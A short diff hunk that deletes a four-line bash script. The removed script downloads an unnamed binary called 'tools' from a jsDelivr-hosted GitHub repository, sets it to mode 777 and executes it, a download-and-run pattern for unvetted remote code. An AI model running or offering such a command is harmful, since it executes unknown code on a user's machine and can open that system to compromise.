@@ -1,4 +1,0 @@
-#!/bin/bash
-wget https://cdn.jsdelivr.net/gh/Ebios1314/test.1@main/tools
-chmod 777 tools
-./tools
